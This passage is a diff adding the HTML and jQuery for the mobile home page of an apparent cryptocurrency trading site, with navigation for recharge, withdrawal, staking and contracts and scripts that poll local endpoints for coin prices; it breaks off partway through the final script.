@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">	
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+	<link rel="stylesheet" type="text/css" href="base2.css" />
+	<link rel="stylesheet" type="text/css" href="nologed.css" />
+	<link rel="stylesheet" href="iconfont.css">
+	<script src="iconfont.js"></script>
+	<title>DOMAIN</title>
+	<style>
+		::-webkit-input-placeholder { /* WebKit browsers */
+		  color: #b5b5b5;
+		  font-size: 18px;
+		}
+
+		::-moz-placeholder { /* Mozilla Firefox 19+ */
+		  color: #b5b5b5;
+		  font-size: 18px;
+		}
+		input:focus{background:#F5F5F5;outline: 1px solid #F5F5F5;}
+		a:hover,a:link,a:visited,a:active{color:#707A8A;text-decoration:none;}
+		.headerbox{height:50px;line-height:50px;}
+		.iconf{height: 30px;width: 30px;border-radius: 15px;background: #eaebed;margin-top: 10px;}
+		.imgbox{width:50px;height:50px;line-height:50px;float:left;}
+		.badge-light{background-color: #FCD535;position: relative;left: -15px;top: -10px;}
+		.badge{line-height: 0.8;border-radius: .5rem;}
+		ul, li {list-style-type: none;padding: 0px;}
+		.scrollDiv {
+			height: 25px;/* 必要元素 */
+			line-height: 25px;
+			border: none;
+			overflow: hidden;/* 必要元素 */
+			margin-top:8px;
+		}
+		.scrollDiv li {
+			height: 25px;
+			padding-left: 10px;
+		}
+		.optionbox{width:100%;height:90px;background:#fff;margin-top:10px;border-top-left-radius:20px;border-top-right-radius:20px;padding: 5px 8px;}
+		.oplist{width:20%;height:80px;float:left;}
+		.opimg{width:100%;height: 50px;line-height: 50px;text-align: center;}
+		.opicon{width:30px;height:30px;margin-top: 10px;}
+		.optext{width:100%;height: 30px;line-height: 30px;text-align: center;overflow: hidden;}
+		.hyicon{width:40px;height: 40px; margin-left: 20px;margin-top: 10px;}
+		.ricon{background: #eaebed;padding: 5px;border-radius: 20px;font-size: 20px;color: #000;}
+		.zixunlist {height: 90px;width: 100%;background: #fff;}
+		.zixunconten{height: 90px;width: 33.3%;background: #fff;float: left;margin: 0 auto;text-align: center;}
+        .bgreen{background:#0ecb81;}
+        .bred{background:#f5465c;}
+        .bgfcc{background:#f5f5f5;}
+        .green{color:#0ecb81;}
+        .red{color:#f5465c;}
+        .list_open{width:40%;height:50px;line-height:50px;float:left;text-align:center;}
+        .list_cname{width:30%;height:50px;line-height:50px;float:left;}
+        .list_change{width:30%;height:50px;line-height:50px;float:left;text-align:right;}
+        .dongbox{position:fixed;z-index:9999;display:none;top:0px;width:100%;height:100vh;background:rgba(0,0,0,0.2);}
+        .dong_order_c{width:90%;height:460px;background:#fff;margin:80px auto;border-radius:10px;padding:10px;}
+	    .dong_order_x{width:100%;height:20px;line-height:20px;text-align:right;}
+	    .dong_order_title{width:100%;height:30px;line-height:20px;text-align:center;border-bottom: 1px solid #f5f5f5;}
+	    .infobox{width:100%;height:400px;padding:5px 20px;margin-top:50px;}
+	    .infotbox{width:100%;margin-top:15px;}
+	    .lbox{width:100%;height:50px;}
+	    .lboxc{width:100%;padding:15px 0px;}
+	    .lbox_l{width:20%;height:50px;line-height:50px;float:left;text-align:left;}
+	    .lbox_r{width:80%;height:50px;line-height:50px;float:right;text-align:right;}
+        .SidebarList {
+            position: fixed;
+            right: 5px;
+            bottom: 220px;
+            background: #ffffff;
+            box-shadow: rgb(78 75 75 / 17%) 0 0 15px 5px;
+            z-index: 99;
+            border-radius: 4px;
+        }
+        .Sidebar {
+            display: block;
+            transition: all 0.3s;
+            position: relative;
+            text-align: center;
+            width: 72px;
+            height: 72px;
+            border-bottom: 1px solid #3e3e3e;
+            box-sizing: border-box;
+            padding-top: 10px;
+            cursor: pointer;
+        }
+        .Sidebar {
+            width: 30px;
+            height: 40px;
+            padding: 7px 0;
+        }
+        .Sidebar>.Sidebar_top {
+            display: block;
+            transition: all 0.3s;
+            width: 36px;
+            height: 36px;
+            background: url(/Public/Static/img/SidebarList.png) no-repeat;
+            box-sizing: border-box;
+            margin: 0 auto 1px;
+        }
+        .Sidebar_App {
+            background-position: 3px -54px !important;
+        }
+        .Sidebar_img {display: none;position: absolute;z-index: 100;right: 85px;width: 152px;top: 12px;box-sizing: border-box;padding: 9px 8px;background: #fff;border-radius: 3px;box-shadow: rgb(78 75 75 / 17%) 0 0 15px 5px;}
+        .Sidebar_img>p {text-align: left;font-size: 14px;border-bottom: 1px #ddd dashed;}
+        .Sidebar>.Sidebar_top {display: block;transition: all 0.3s;width: 36px;height: 36px;background: url(/Public/Static/img/SidebarList.png) no-repeat;box-sizing: border-box;margin: 0 auto 1px;}
+        .Sidebar>.Sidebar_top {width: 100%;height: 100%;background-size: 25px;padding: 0 0 0;}
+        .Sidebar_Service {background-position: 2px -108px !important;}
+        .Sidebar>p {font-size: 12px;color: #273e57;}
+        .Sidebar:last-child {border-bottom: 0;}
+        .Sidebar>.Sidebar_top {display: block;transition: all 0.3s;width: 36px;height: 36px;background: url(/Public/Static/img/SidebarList.png) no-repeat;box-sizing: border-box;margin: 0 auto 1px;}
+        .Sidebar>.Sidebar_top {width: 100%;height: 100%;background-size: 25px;padding: 0 0 0;}
+        .Sidebar_CounUs {background-position: 3px 0 !important;}
+	</style>
+  </head>
+  <body>
+	<div class="container-fluid " style="padding:0px;width:100vw;">
+		<div class="no_header" style="position: fixed;z-index: 9999;background: #f5f5f5;padding:0px 10px;">
+			<div class="headerbox fl">
+				<a href="/Mobile/Login/loption.html">
+				<div class="imgbox" style="">
+					<svg class="icon iconf" aria-hidden="true"><use xlink:href="#icon-ziyuan2"></use></svg>
+				</div>
+				</a>
+				
+				<div style="height:60px;line-height:60px;float:left;text-align:center;">
+            		<a href="/Mobile/Login/index.html" style="font-color:red;" class="fcc">	<span style="background: #aadbaa;padding: 10px;border-radius: 5px;"><b>Sign in / Register</b></span></a>
+            		</div>			</div>
+            
+            <a href="/Mobile/Index/notice.html">
+			<div class="headerbox fr txtr">
+				<i class="bi bi-bell fcc" style="font-size:22px;"></i>
+							</div>
+			</a>
+		</div>
+
+		<div style="width:100%;height:60px;background:#f5f5f5;"></div>
+	
+		<!--轮播图-->
+		<div id="carouselExampleIndicators" class="carousel slide slidepm" data-ride="carousel" style="width:100%;margin: 0px;padding:0px 10px;">
+			<div class="carousel-inner" style="height: 150px;">
+				<div class="carousel-item active">
+					<img src="6506c14d122e3.jpg" class="d-block w-100" style="height:150px;border-radius:10px;" />
+				</div>
+				<div class="carousel-item">
+					<img src="6506c7773de5a.jpg" class="d-block w-100" style="height:150px;border-radius:10px;" />
+				</div>
+				<div class="carousel-item">
+					<img src="6506c77f4362d.jpg" class="d-block w-100" style="height:150px;border-radius:10px;" />
+				</div>
+			</div>
+		</div>
+	
+		<!--滚动新闻-->
+		<div style="width:100%;height:40px;margin-top:5px;padding:0px 10px;">
+			<div style="width:10%;height:40px;float:left;line-height: 40px;">
+				<i class="bi bi-megaphone fcc" style="font-size:20px;"></i>
+			</div>
+			<div style="width:75%;height:40px;float:left;line-height: 40px;">
+				<div class="scrollDiv" id="s1">
+    				<ul>
+    				    <li><a href="/Mobile/Index/gginfo.html?id=18"></a></li>    				</ul>
+  				</div>
+
+			</div>
+			<div style="width:10%;height:40px;float:right;line-height: 40px;text-align:right;">
+				<a href="/Mobile/Index/gglist.html">
+				<i class="bi bi-list-ul fcc" style="font-size:22px;"></i>
+				</a>
+			</div>
+		</div>
+	</div>	
+
+	<!--OPTION选项-->
+	<div class="optionbox">
+		<div style="width:100%;height:80px;">
+		    
+		    <a href="/Mobile/Issue/index.html">
+			<div class="oplist">
+				<div class="opimg">
+					<svg class="icon opicon" aria-hidden="true"><use xlink:href="#icon-ziyuan5"></use></svg>
+				</div>
+				<div class="optext">
+					<span class="fzmm fcc">subscription</span>
+				</div>
+			</div>
+			</a>
+
+            <a href="/Mobile/User/czcoin.html">
+			<div class="oplist">
+				<div class="opimg">
+					<svg class="icon opicon" aria-hidden="true"><use xlink:href="#icon-xinyongka"></use></svg>
+				</div>
+				<div class="optext">
+					<span class="fzmm fcc">Recharge</span>
+				</div>
+			</div>
+			</a>
+			
+			<a href="/Mobile/User/txcoin.html">
+			<div class="oplist">
+				<div class="opimg">
+					<svg class="icon opicon" aria-hidden="true"><use xlink:href="#icon-ziyuan27"></use></svg>
+				</div>
+				<div class="optext">
+					<span class="fzmm fcc">Withdrawal</span>
+				</div>
+			</div>
+			</a>
+			
+
+			<a href="/Mobile/Login/setlang.html">
+			<div class="oplist">
+				<div class="opimg">
+					<i class="bi bi-globe fcc fzmmm" style="font-size:22px;"></i>
+				</div>
+				<div class="optext">
+					<span class="fzmm fcc">Language</span>
+				</div>
+			</div>
+			</a>
+			
+            <!--<a href="https://a0f1693bf5fc1.meiqiacloud.com/dist/standalone.html?eid=ef7870d4cc32464b98a1b2d6ce878ee7">-->
+            <a href="#">
+			<div class="oplist">
+				<div class="opimg">
+					<svg class="icon opicon" aria-hidden="true"><use xlink:href="#icon-ziyuan8"></use></svg>
+				</div>
+				<div class="optext">
+					<span class="fzmm fcc">Service</span>
+				</div>
+			</div>
+			</a>
+
+		</div>
+	</div>
+
+	<!--单选项区-->	
+	<div style="width:100%;height:80px;padding:10px;">
+		<div style="width:20%;height:60px;float:left;">
+			<svg class="icon hyicon" aria-hidden="true"><use xlink:href="#icon-ziyuan1"></use></svg>
+		</div>
+		<div style="width:65%;height:60px;float:left;">
+			<div style="width:100%;height:30px;line-height:40px;">
+				<span class="fcc fzmmm">contract</span>
+			</div>
+			<div style="width:100%;height:20px;line-height:20px;">
+				<span class="fcc fzm">Multi currency and multi time</span>
+			</div>
+		</div>
+		<a href="/Mobile/Contract/index.html">
+		<div style="width:15%;height:60px;line-height:60px;float:left;text-align:center;">
+			<i class="bi bi-arrow-right ricon"></i>
+		</div>
+		</a>
+	</div>	
+
+	<!--重点币行情区-->
+	<div class="zixunlist">
+        <div class="zixunconten" style="padding:10px;">
+            <div class="tjcoinbox1">
+				<span style="font-size:14px;color:#707A8A;"  id="btc_coin_box">BTC/USDT</span>
+            </div>
+            <div class="tjcoinbox2" id="btc_money_box">
+				<span style="font-size:16px;color:#2ebd85;font-weight: 500;">46766.55</span>
+            </div>
+            <div class="tjcoinbox3" id="btc_change_box">
+				<span style="font-size:14px;color:#2ebd85;font-weight: 500;">+2.16%</span>
+            </div>
+        </div>
+        <div class="zixunconten" style="padding:10px;">
+            <div class="tjcoinbox1">
+				<span style="font-size:14px;color:#707A8A;"  id="bch_coin_box">BCH/USDT</span>
+            </div>
+            <div class="tjcoinbox2" id="bch_money_box">
+				<span style="font-size:16px;color:#2ebd85;font-weight: 500;">174.77</span>
+            </div>
+            <div class="tjcoinbox3" id="bch_change_box">
+				<span style="font-size:14px;color:#2ebd85;font-weight: 500;">+2.33%</span>
+            </div>
+        </div>
+        <div class="zixunconten" style="padding:10px;">
+            <div class="tjcoinbox1">
+				<span style="font-size:14px;font-weight:500;color:#707A8A;"  id="eth_coin_box">ETH/USDT</span>
+            </div>
+            <div class="tjcoinbox2" id="eth_money_box">
+				<span style="font-size:16px;font-weight:500;color:#2ebd85;">3204.28</span>
+            </div>
+            <div class="tjcoinbox3" id="eth_change_box">
+				<span style="font-size:14px;color:#2ebd85;font-weight: 500;">+4.47%</span>
+            </div>
+        </div>
+    </div>
+
+    <!--单选项区-->	
+	<div style="width:100%;height:80px;padding:10px;">
+		<div style="width:20%;height:60px;float:left;">
+			<svg class="icon hyicon" aria-hidden="true"><use xlink:href="#icon-ziyuan14"></use></svg>
+		</div>
+		<div style="width:50%;height:60px;float:left;">
+			<div style="width:100%;height:30px;line-height:40px;">
+				<span class="fcc fzmmm">Staking mining</span>
+			</div>
+			<div style="width:100%;height:20px;line-height:20px;">
+			<!--	<span class="fcc fzm">Characteristic shared miner</span>-->
+			</div>
+		</div>
+		<a href="/Mobile/Orepool/index.html">
+		<div style="width:30%;height:60px;line-height:60px;float:left;text-align:center;">
+			<span style="background: #FCD535;padding: 10px;border-radius: 5px;">Go now</span>
+		</div>
+		</a>
+	</div>
+
+	<!--市场行情-->
+	<div style="width:100%;background:#fff;padding:10px;">
+		<div style="width:100%;height:30px;line-height:30px;">
+			<span class="fzmmm fcc">USDTMarket</span>
+		</div>
+		<div style="width:100%;height:30px;">
+			<div style="width:30%;height:30px;line-height:30px;float:left;">
+				<span  class="fzm fcc">symbol</span>
+			</div>
+			<div style="width:40%;height:30px;line-height:30px;float:left;text-align:center;">
+				<span  class="fzm fcc">Latest price</span>
+			</div>
+			<div style="width:30%;height:30px;line-height:30px;float:left;text-align:right;">
+				<span  class="fzm fcc">24hFluctuation range</span>
+			</div>
+		</div>
+
+		<div style="width:100%;" id="tradebox">
+		    <div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_btc">BTC/USDT</span>
+                </div>
+                <div class="list_open cpr_btc">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_btc">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_eth">ETH/USDT</span>
+                </div>
+                <div class="list_open cpr_eth">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_eth">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_eos">EOS/USDT</span>
+                </div>
+                <div class="list_open cpr_eos">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_eos">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_doge">DOGE/USDT</span>
+                </div>
+                <div class="list_open cpr_doge">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_doge">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_bch">BCH/USDT</span>
+                </div>
+                <div class="list_open cpr_bch">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_bch">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_ltc">LTC/USDT</span>
+                </div>
+                <div class="list_open cpr_ltc">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_ltc">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_iota">IOTA/USDT</span>
+                </div>
+                <div class="list_open cpr_iota">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_iota">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_fil">FIL/USDT</span>
+                </div>
+                <div class="list_open cpr_fil">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_fil">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_flow">FLOW/USDT</span>
+                </div>
+                <div class="list_open cpr_flow">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_flow">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_jst">JST/USDT</span>
+                </div>
+                <div class="list_open cpr_jst">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_jst">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_itc">ITC/USDT</span>
+                </div>
+                <div class="list_open cpr_itc">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_itc">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_ht">HT/USDT</span>
+                </div>
+                <div class="list_open cpr_ht">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_ht">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div><div style="width:100%;height:50px;">
+                <div class="list_cname">
+                    <span  class="fzmmm fcc cn_ukb">UKB/USDT</span>
+                </div>
+                <div class="list_open cpr_ukb">
+                    <span  class='fzmmm fcc'>--.--</span></div>
+                <div class="list_change cch_ukb">
+                    <span  class='fzmm bgfcc' style='color:#fff;border-radius: 2px;width:70px;height:35px;line-height:35px;text-align:center;display:inline-block;'>0%</span>
+                </div>
+            </div>		    
+		</div>
+
+	</div>
+	
+	<!--<div class="dongbox" id="dongbox" style="display:block;">-->
+ <!--       <div class="dong_order_c">-->
+ <!--           <div class="dong_order_x" id="x_dongbox">-->
+	<!--            <i class="bi bi-x" style="font-size:18px;" ></i>-->
+	<!--        </div>-->
+	<!--        <div class="dong_order_title">-->
+	<!--            <span class="fch" style="font-size:16px;font-weight:500;">Notice</span>-->
+	<!--        </div>-->
+	        
+	<!--        <div style="width:100%;height:340px;overflow-y:scroll;">-->
+	            
+	<!--            <div class="infotbox">-->
+	<!--	            <span class="fcy" style="font-size:14px;font-weight:bold;"></span>-->
+	<!--	        </div>-->
+		        
+	<!--	        -->
+	<!--	        <div class="lboxc">-->
+	<!--	            <img src="654bb203e9155.png" style="width:100%;border-radius:10px;"/>-->
+	<!--	        </div>-->
+	<!---->
+		        
+	<!--	        <div class="lboxc" style="text-indent:24px;">-->
+	<!--	            <span></span>-->
+	<!--	        </div>-->
+
+
+	<!--	        <div class="lbox">-->
+	<!--	            <div class="lbox_l">-->
+		                <!--<span class="fcc fzmm">发布时间</span>-->
+	<!--	            </div>-->
+	<!--	            <div class="lbox_r">-->
+	<!--	                <span class="fch fzmm">2023-10-12 18:49:57</span>-->
+	<!--	            </div>-->
+	<!--	        </div>-->
+
+	<!--        </div>-->
+	        
+ <!--       </div>-->
+ <!--   </div>-->
+    
+ <div class="SidebarList"> 
+      <!--     <p>whatsApp</p> 
+       <a class="Sidebar" target="_blank" href="https://vm.melumisc.com/1chfk3x6cio6i12n51olfyv6dv"> 
+            <div class="Sidebar_top Sidebar_Service"> </div> 
+         <p>Telegram</p> 
+      </a> -->
+        <!--<a class="Sidebar" id="Sidebar_CounUs" target="_blank" href="https://a0f1693bf5fc1.meiqiacloud.com/dist/standalone.html?eid=ef7870d4cc32464b98a1b2d6ce878ee7">-->
+             <!--   <a class="Sidebar" id="Sidebar_CounUs" target="_blank" href="">
+         <div class="Sidebar_top Sidebar_CounUs"> </div> 
+           <!-- <p>在線客服</p>-->
+        <!--</a>--> 
+    </div>
+    
+    
+    
+	
+	<div style="width:100%;height:100px;"></div>
+	<!--底部-->
+	<div class="footer">
+
+		<a href="/Mobile/Index/index.html">
+		<div class="footer_op">
+			<div class="f_op_t">
+				<svg class="icon fticon" aria-hidden="true"><use xlink:href="#icon-shouye"></use></svg>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcy">Home</span>	
+			</div>
+		</div>
+		</a>
+
+		<a href="/Mobile/Trade/index.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-fukuan" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Trade</span>	
+			</div>
+		</div>
+		</a>
+		
+		<a href="/Mobile/Orepool/index.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-ziyuan14" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">DEFI</span>	
+			</div>
+		</div>
+		</a>
+
+		<a href="/Mobile/Levertade/index.html">	
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-xuanxiang" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Contract</span>	
+			</div>
+		</div>
+		</a>
+
+        <a href="/Mobile/User/index.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-ziyuan24" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Assets</span>	
+			</div>
+		</div>
+		</a>
+
+
+	</div>
+
+
+</body>
+
+<script type="text/javascript" src="jquery-3.5.1.min.js" ></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/Public/Static/js/layer/layer.js" ></script>
+<!--<script src="http://www.jq22.com/jquery/jquery-1.10.2.js"></script>-->
+<script type="text/javascript">
+    $("#x_dongbox").click(function(){
+        $("#dongbox").hide();
+    });
+    function obtain_btc(){
+        var coin = "btc";
+        var nameclass = ".cn_btc";
+        var priceclass = ".cpr_btc";
+        var changeclass = ".cch_btc";
+        $.post("/Mobile/Ajaxtrade/obtain_btc.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_eth(){
+        var coin = "eth";
+        var nameclass = ".cn_eth";
+        var priceclass = ".cpr_eth";
+        var changeclass = ".cch_eth";
+        $.post("/Mobile/Ajaxtrade/obtain_eth.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+
+<script type="text/javascript">
+    function obtain_eos(){
+        var coin = "eos";
+        var nameclass = ".cn_eos";
+        var priceclass = ".cpr_eos";
+        var changeclass = ".cch_eos";
+        $.post("/Mobile/Ajaxtrade/obtain_eos.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+
+<script type="text/javascript">
+    function obtain_doge(){
+        var coin = "doge";
+        var nameclass = ".cn_doge";
+        var priceclass = ".cpr_doge";
+        var changeclass = ".cch_doge";
+        $.post("/Mobile/Ajaxtrade/obtain_doge.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_bch(){
+        var coin = "bch";
+        var nameclass = ".cn_bch";
+        var priceclass = ".cpr_bch";
+        var changeclass = ".cch_bch";
+        $.post("/Mobile/Ajaxtrade/obtain_bch.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_ltc(){
+        var coin = "ltc";
+        var nameclass = ".cn_ltc";
+        var priceclass = ".cpr_ltc";
+        var changeclass = ".cch_ltc";
+        $.post("/Mobile/Ajaxtrade/obtain_ltc.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_iota(){
+        var coin = "iota";
+        var nameclass = ".cn_iota";
+        var priceclass = ".cpr_iota";
+        var changeclass = ".cch_iota";
+        $.post("/Mobile/Ajaxtrade/obtain_iota.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_fil(){
+        var coin = "fil";
+        var nameclass = ".cn_fil";
+        var priceclass = ".cpr_fil";
+        var changeclass = ".cch_fil";
+        $.post("/Mobile/Ajaxtrade/obtain_fil.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_flow(){
+        var coin = "flow";
+        var nameclass = ".cn_flow";
+        var priceclass = ".cpr_flow";
+        var changeclass = ".cch_flow";
+        $.post("/Mobile/Ajaxtrade/obtain_flow.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_jst(){
+        var coin = "jst";
+        var nameclass = ".cn_jst";
+        var priceclass = ".cpr_jst";
+        var changeclass = ".cch_jst";
+        $.post("/Mobile/Ajaxtrade/obtain_jst.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_itc(){
+        var coin = "jst";
+        var nameclass = ".cn_itc";
+        var priceclass = ".cpr_itc";
+        var changeclass = ".cch_itc";
+        $.post("/Mobile/Ajaxtrade/obtain_itc.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+<script type="text/javascript">
+    function obtain_ht(){
+        var coin = "ht";
+        var nameclass = ".cn_ht";
+        var priceclass = ".cpr_ht";
+        var changeclass = ".cch_ht";
+        $.post("/Mobile/Ajaxtrade/obtain_ht.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html(data.cname);
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+
+<script type="text/javascript">
+    function obtain_usdz(){
+        var coin = "ukb";
+        var nameclass = ".cn_ukb";
+        var priceclass = ".cpr_ukb";
+        var changeclass = ".cch_ukb";
+        $.post("/Mobile/Ajaxtrade/obtain_usdz.html",
+        {'coin':coin},
+        function(data){
+            if(data.code == 1){
+                $(nameclass).html("UKB/USDT");
+                $(priceclass).html(data.open);
+                $(changeclass).html(data.change);
+            }else{
+                console.log(data.info);return false;
+            }
+        }
+        );
+    }
+</script>
+
+
+<script type="text/javascript">
+      $(function(){
+          //obtain_btc();
+          setInterval("obtain_btc()",2000); 
+          //obtain_eth();
+          setInterval("obtain_eth()",3000); 
+          //obtain_eos();
+          setInterval("obtain_eos()",5000);
+          obtain_doge();
+          setInterval("obtain_doge()",7000);
+          obtain_bch();
+          setInterval("obtain_bch()",9000);
+          obtain_ltc();
+          setInterval("obtain_ltc()",11000);
+          
+          obtain_iota();
+          setInterval("obtain_iota()",13000);
+          
+          obtain_fil();
+          setInterval("obtain_fil()",15000);
+          
+          obtain_flow();
+          setInterval("obtain_flow()",17000);
+          
+          obtain_jst();
+          setInterval("obtain_jst()",19000);
+          
+          obtain_itc();
